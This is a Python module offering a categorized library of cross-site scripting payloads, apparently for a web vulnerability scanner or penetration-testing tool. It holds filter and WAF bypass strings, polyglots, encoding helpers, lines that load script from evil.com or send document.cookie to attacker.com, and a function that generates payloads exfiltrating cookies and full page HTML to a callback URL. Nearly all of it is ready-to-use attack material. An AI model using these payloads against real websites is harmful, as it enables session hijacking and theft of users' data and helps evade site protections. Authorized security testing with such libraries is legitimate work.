#!/usr/bin/env python3
"""
Comprehensive XSS Payload Library

Categorized payloads for different XSS contexts and filter bypass techniques.
"""

from typing import Dict, List
import base64
import urllib.parse


class XSSPayloads:
    """Comprehensive XSS payload library with context-aware payloads"""
    
    # Basic Script-Based Payloads
    SCRIPT_BASED = [
        "<script>alert('XSS')</script>",
        "<script>alert(document.domain)</script>",
        "<script>alert(document.cookie)</script>",
        "<script>alert(window.origin)</script>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<script>alert`1`</script>",
        "<script>alert(1)</script>",
        "<script src=//evil.com/xss.js></script>",
        "<script>fetch('//attacker.com?c='+document.cookie)</script>",
    ]
    
    # Event Handler Payloads
    EVENT_HANDLERS = [
        "<img src=x onerror=alert('XSS')>",
        "<img src=x onerror=alert(1)>",
        "<img src='x' onerror='alert(document.domain)'>",
        "<svg/onload=alert('XSS')>",
        "<svg onload=alert(1)>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<marquee onstart=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "<video src=x onerror=alert('XSS')>",
        "<audio src=x onerror=alert('XSS')>",
        "<iframe onload=alert('XSS')>",
    ]
    
    # DOM-Based Payloads
    DOM_BASED = [
        "javascript:alert('XSS')",
        "javascript:alert(document.domain)",
        "javascript:eval('alert(1)')",
        "data:text/html,<script>alert('XSS')</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
        "#<script>alert('XSS')</script>",
        "'><script>alert(document.location)</script>",
    ]
    
    # Attribute-Based Payloads
    ATTRIBUTE_BASED = [
        "' autofocus onfocus=alert('XSS') '",
        '" autofocus onfocus=alert(\'XSS\') "',
        "' onclick=alert('XSS') '",
        '" onclick=alert(\'XSS\') "',
        "'><img src=x onerror=alert('XSS')>",
        '"><img src=x onerror=alert(\'XSS\')>',
        "'/><script>alert('XSS')</script>",
        "'/><img src=x onerror=alert(1)>",
        '"/><script>alert(\'XSS\')</script>',
        '"/><img src=x onerror=alert(1)>',
        "' onmouseover='alert(`XSS`)'",
        '" onmouseover="alert(`XSS`)"',
    ]
    
    # Filter Bypass Techniques
    FILTER_BYPASS = [
        # Case variation
        "<ScRiPt>alert('XSS')</sCrIpT>",
        "<sCrIpT>alert('XSS')</ScRiPt>",
        "<IMG SRC=x ONERROR=alert('XSS')>",
        
        # Null byte injection
        "<script\\x00>alert('XSS')</script>",
        
        # Double encoding
        "%253Cscript%253Ealert('XSS')%253C/script%253E",
        
        # Nested tags
        "<<SCRIPT>alert('XSS');//<</SCRIPT>",
        "<sc<script>ript>alert('XSS')</sc</script>ript>",
        
        # Comment breaking
        "<script><!--alert('XSS')--></script>",
        "<script>/*alert('XSS')*/</script>",
        
        # Unicode normalization
        "<script>\\u0061lert('XSS')</script>",
        
        # Protocol variations
        "<iframe src=j&#97;vascript:alert('XSS')>",
        "<iframe src=j&#x61;vascript:alert('XSS')>",
        
        # Whitespace variations
        "<img/src=x/onerror=alert('XSS')>",
        "<img\\nsrc=x\\nonerror=alert('XSS')>",
        "<img\\tsrc=x\\tonerror=alert('XSS')>",
        
        # Without quotes
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        
        # Template literals
        "<script>alert`XSS`</script>",
        "<img src=x onerror=alert`1`>",
    ]
    
    # Context-Specific Payloads
    JAVASCRIPT_CONTEXT = [
        "'-alert('XSS')-'",
        "';alert('XSS')//",
        "</script><script>alert('XSS')</script>",
        "</script><img src=x onerror=alert('XSS')>",
        "'+(alert('XSS'))+''",
        '")alert(\'XSS\')//',
        '"+(alert(\'XSS\'))+"',
        '");alert(\'XSS\');//',
    ]
    
    HTML_CONTEXT = [
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
    ]
    
    URL_CONTEXT = [
        "javascript:alert('XSS')",
        "data:text/html,<script>alert('XSS')</script>",
        "//evil.com/%0Aalert('XSS')",
    ]
    
    CSS_CONTEXT = [
        "</style><script>alert('XSS')</script>",
        "</style><img src=x onerror=alert('XSS')>",
        "expression(alert('XSS'))",
        "behavior:url(xss.htc)",
    ]
    
    # Polyglot Payloads (work in multiple contexts)
    POLYGLOT = [
        '''javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>''',
        ''''">--></style></script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
''',
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e",
    ]
    
    # WAF Bypass Payloads
    WAF_BYPASS = [
        # Cloudflare bypass attempts
        "<svg%0Aonload%0A=%0Aalert(1)>",
        "<iframe%0Asrc%0A=%0Ajavascript:alert(1)%0A>",
        
        # Imperva bypass attempts
        "<img src=x:alert(alt) onerror=eval(src) alt=xss>",
        
        # Generic bypasses
        "<img src=1 onerror=alert(1)>",
        "<svg><animate onbegin=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
    ]
    
    @classmethod
    def get_all_payloads(cls) -> List[str]:
        """Get all payloads combined"""
        all_payloads = []
        all_payloads.extend(cls.SCRIPT_BASED)
        all_payloads.extend(cls.EVENT_HANDLERS)
        all_payloads.extend(cls.DOM_BASED)
        all_payloads.extend(cls.ATTRIBUTE_BASED)
        all_payloads.extend(cls.FILTER_BYPASS)
        all_payloads.extend(cls.POLYGLOT)
        return list(set(all_payloads))
    
    @classmethod
    def get_basic_payloads(cls) -> List[str]:
        """Get basic payloads for quick testing"""
        basic = []
        basic.extend(cls.SCRIPT_BASED[:3])
        basic.extend(cls.EVENT_HANDLERS[:3])
        basic.extend(cls.DOM_BASED[:2])
        return basic
    
    @classmethod
    def get_context_payloads(cls, context: str) -> List[str]:
        """
        Get payloads appropriate for a specific context
        
        Args:
            context: One of 'html', 'attribute', 'javascript', 'url', 'css'
        
        Returns:
            List of context-appropriate payloads
        """
        context_map = {
            'html': cls.HTML_CONTEXT + cls.SCRIPT_BASED + cls.EVENT_HANDLERS,
            'attribute': cls.ATTRIBUTE_BASED + cls.EVENT_HANDLERS,
            'javascript': cls.JAVASCRIPT_CONTEXT,
            'url': cls.URL_CONTEXT + cls.DOM_BASED,
            'css': cls.CSS_CONTEXT,
            'unknown': cls.POLYGLOT + cls.FILTER_BYPASS,
        }
        
        return context_map.get(context.lower(), cls.get_all_payloads())
    
    @classmethod
    def get_waf_bypass_payloads(cls) -> List[str]:
        """Get WAF bypass payloads"""
        return cls.WAF_BYPASS + cls.FILTER_BYPASS
    
    @classmethod
    def encode_payload(cls, payload: str, encoding: str = 'url') -> str:
        """
        Encode payload using various encoding schemes
        
        Args:
            payload: Original payload
            encoding: Encoding type ('url', 'double_url', 'base64', 'html_entity')
        
        Returns:
            Encoded payload
        """
        if encoding == 'url':
            return urllib.parse.quote(payload)
        elif encoding == 'double_url':
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif encoding == 'base64':
            return base64.b64encode(payload.encode()).decode()
        elif encoding == 'html_entity':
            return ''.join(f'&#{ord(c)};' for c in payload)
        else:
            return payload
    
    @classmethod
    def generate_exploitation_payloads(cls, callback_url: str) -> List[str]:
        """
        Generate exploitation payloads with callback URL
        
        Args:
            callback_url: URL to receive callbacks (e.g., Burp Collaborator, webhook)
        
        Returns:
            List of exploitation payloads
        """
        return [
            f"<script>fetch('{callback_url}?c='+document.cookie)</script>",
            f"<script>new Image().src='{callback_url}?c='+document.cookie</script>",
            f"<script>navigator.sendBeacon('{callback_url}',document.cookie)</script>",
            f"<img src=x onerror=this.src='{callback_url}?c='+document.cookie>",
            f"<svg/onload=fetch('{callback_url}?d='+document.domain)>",
            f"<script>fetch('{callback_url}',{{method:'POST',body:document.documentElement.innerHTML}})</script>",
        ]


def load_custom_payloads(filepath: str) -> List[str]:
    """
    Load custom payloads from a file
    
    Args:
        filepath: Path to payload file (one payload per line)
    
    Returns:
        List of payloads
    """
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        return payloads
    except FileNotFoundError:
        return []
    except Exception as e:
        print(f"Error loading custom payloads: {e}")
        return []
